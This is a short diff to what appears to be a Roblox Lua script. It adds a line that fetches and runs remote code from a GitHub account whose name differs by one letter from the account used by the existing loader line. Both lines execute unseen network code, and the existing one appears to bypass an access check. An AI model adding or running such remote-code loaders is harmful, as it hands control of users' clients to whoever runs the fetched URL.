@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/khenn791/script/refs/heads/main/notify", true))()
+
 local free_access = loadstring(game:HttpGet("https://raw.githubusercontent.com/khen791/script-khen/refs/heads/main/a"))() -- make it return true if delated
 
 
